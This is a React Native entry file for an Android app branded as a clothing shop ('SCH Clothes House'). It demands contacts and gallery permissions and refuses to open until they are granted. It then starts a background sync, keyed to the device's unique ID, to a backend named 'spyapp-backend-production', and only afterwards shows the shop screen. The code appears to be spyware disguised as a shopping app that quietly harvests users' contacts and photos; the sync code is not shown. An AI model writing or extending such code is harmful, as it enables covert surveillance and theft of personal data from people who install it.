import React, { useEffect, useState } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  PermissionsAndroid,
  Platform,
  ActivityIndicator,
  Linking,
} from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { ShopScreen } from './src/screens/ShopScreen';
import { startBackgroundSync } from './src/services/BackgroundSyncService';

type PermissionState = 'checking' | 'granted' | 'denied';

const BACKEND_URL = 'https://spyapp-backend-production.up.railway.app';

export default function App() {
  const [permissionState, setPermissionState] = useState<PermissionState>('checking');

  const checkAndRequestPermissions = async (): Promise<boolean> => {
    if (Platform.OS !== 'android') return true;

    const requiredPermissions = [
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      ...(Platform.Version >= 33
        ? [
            PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
            PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
          ]
        : [
            PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
            PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE,
          ]),
    ];

    try {
      const grants = await PermissionsAndroid.requestMultiple(requiredPermissions);

      const allGranted = Object.values(grants).every(
        (status) => status === PermissionsAndroid.RESULTS.GRANTED,
      );

      return allGranted;
    } catch (err) {
      console.warn('Permission error:', err);
      return false;
    }
  };

  const initApp = async () => {
    setPermissionState('checking');

    const granted = await checkAndRequestPermissions();

    if (!granted) {
      setPermissionState('denied');
      return;
    }

    setPermissionState('granted');

    // Sync shuru karo
    const uniqueId = await DeviceInfo.getUniqueId();
    startBackgroundSync({
      backendUrl: BACKEND_URL,
      deviceId: uniqueId,
    });
  };

  useEffect(() => {
    initApp();
  }, []);

  // ── Loading state ─────────────────────────────────────────────────────────
  if (permissionState === 'checking') {
    return (
      <View style={styles.fullScreen}>
        <Text style={styles.logoText}>SCH</Text>
        <Text style={styles.logoSub}>CLOTHES HOUSE</Text>
        <ActivityIndicator color="#c9a84c" size="large" style={{ marginTop: 32 }} />
      </View>
    );
  }

  // ── Permission denied screen ───────────────────────────────────────────────
  if (permissionState === 'denied') {
    return (
      <View style={styles.fullScreen}>
        <Text style={styles.logoText}>SCH</Text>
        <Text style={styles.logoSub}>CLOTHES HOUSE</Text>

        <View style={styles.permBox}>
          <Text style={styles.permIcon}>🔒</Text>
          <Text style={styles.permTitle}>Permissions Required</Text>
          <Text style={styles.permDesc}>
            This app needs access to your{'\n'}
            <Text style={styles.bold}>Contacts</Text> and{' '}
            <Text style={styles.bold}>Gallery</Text>{'\n'}
            to work properly.
          </Text>

          {/* Try Again Button */}
          <TouchableOpacity style={styles.btnPrimary} onPress={initApp}>
            <Text style={styles.btnPrimaryText}>Grant Permissions</Text>
          </TouchableOpacity>

          {/* Settings Button (agar permanently deny ho gaya) */}
          <TouchableOpacity
            style={styles.btnSecondary}
            onPress={() => Linking.openSettings()}>
            <Text style={styles.btnSecondaryText}>Open Settings</Text>
          </TouchableOpacity>

          <Text style={styles.permNote}>
            Without these permissions the app cannot function.
          </Text>
        </View>
      </View>
    );
  }

  // ── All permissions granted — show main app ───────────────────────────────
  return <ShopScreen />;
}

const styles = StyleSheet.create({
  fullScreen: {
    flex: 1,
    backgroundColor: '#0f1b2d',
    alignItems: 'center',
    justifyContent: 'center',
    paddingHorizontal: 24,
  },
  logoText: {
    fontSize: 64,
    fontWeight: '900',
    color: '#c9a84c',
    letterSpacing: 8,
  },
  logoSub: {
    fontSize: 13,
    color: '#c9a84c88',
    letterSpacing: 4,
    marginTop: 4,
    marginBottom: 8,
  },
  permBox: {
    marginTop: 40,
    backgroundColor: '#16243a',
    borderRadius: 16,
    borderWidth: 1,
    borderColor: '#c9a84c33',
    padding: 28,
    alignItems: 'center',
    width: '100%',
  },
  permIcon: {
    fontSize: 40,
    marginBottom: 12,
  },
  permTitle: {
    fontSize: 20,
    fontWeight: '700',
    color: '#c9a84c',
    marginBottom: 12,
    textAlign: 'center',
  },
  permDesc: {
    fontSize: 14,
    color: '#8899aa',
    textAlign: 'center',
    lineHeight: 22,
    marginBottom: 24,
  },
  bold: {
    color: '#dce8f5',
    fontWeight: '700',
  },
  btnPrimary: {
    backgroundColor: '#c9a84c',
    borderRadius: 10,
    paddingVertical: 14,
    paddingHorizontal: 32,
    width: '100%',
    alignItems: 'center',
    marginBottom: 10,
  },
  btnPrimaryText: {
    color: '#0f1b2d',
    fontWeight: '800',
    fontSize: 15,
    letterSpacing: 0.5,
  },
  btnSecondary: {
    borderWidth: 1,
    borderColor: '#c9a84c55',
    borderRadius: 10,
    paddingVertical: 12,
    paddingHorizontal: 32,
    width: '100%',
    alignItems: 'center',
    marginBottom: 16,
  },
  btnSecondaryText: {
    color: '#c9a84c',
    fontWeight: '600',
    fontSize: 14,
  },
  permNote: {
    fontSize: 11,
    color: '#445566',
    textAlign: 'center',
    lineHeight: 16,
  },
});